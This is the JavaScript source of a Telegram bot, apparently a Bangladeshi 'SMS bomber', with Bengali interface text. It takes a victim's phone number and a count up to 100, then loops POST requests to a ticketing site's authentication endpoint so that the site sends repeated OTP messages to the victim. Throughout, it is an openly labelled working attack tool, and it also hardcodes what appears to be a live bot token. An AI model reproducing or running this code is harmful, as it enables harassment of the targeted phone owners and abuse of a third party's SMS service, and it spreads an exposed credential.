const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const qs = require('qs');
const http = require('http');

// আপনার টেলিগ্রাম বটের টোকেন
const token = '8784762504:AAFiS-NC-2BSnDauKrTM9GFQ3n91c6_OPfk';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Render-এ বটকে সচল রাখার জন্য একটি ছোট সার্ভার
http.createServer((req, res) => {
    res.write("S.R.M TELECOM Bot is Running!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM Cloud Mode Active...");

bot.onText(/\/start/, (msg) => {
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🚀 SMS Attack শুরু', callback_data: 'get_num' }],
                [{ text: '📢 আমাদের চ্যানেল', url: 'https://t.me/srmtelecom' }]
            ]
        }
    };
    bot.sendMessage(msg.chat.id, "🔥 **S.R.M TELECOM ক্লাউড বোম্বার**\nএখন এটি ২৪ ঘণ্টা অনলাইনে থাকবে।", {parse_mode: "Markdown", ...opts});
});

bot.on('callback_query', (query) => {
    if (query.data === 'get_num') {
        userStates[query.message.chat.id] = { step: 'num' };
        bot.sendMessage(query.message.chat.id, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**");
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || text === '/start') return;

    if (userStates[chatId]?.step === 'num') {
        if (text.length === 11 && text.startsWith('01')) {
            userStates[chatId] = { step: 'amount', number: text };
            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS পাঠাতে চান? (সর্বোচ্চ ১০০)**`);
        } else {
            bot.sendMessage(chatId, "❌ সঠিক ১১ ডিজিটের নম্বর দিন।");
        }
    } 
    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 100) return bot.sendMessage(chatId, "⚠️ ১-১০০ এর মধ্যে লিখুন।");

        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অ্যাটাক শুরু হয়েছে...`);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            try {
                const data = qs.stringify({ 'phonenumber': '+88' + target });
                await axios.post('https://api.bdtickets.com:20100/v1/auth', data, { 
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 5000 
                });
                success++;
            } catch (e) {}
            await new Promise(r => setTimeout(r, 1500));
        }

        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success}টি`, {
            reply_markup: { inline_keyboard: [[{ text: '🔄 আবার অ্যাটাক দিন', callback_data: 'get_num' }]] }
        });
    }
});

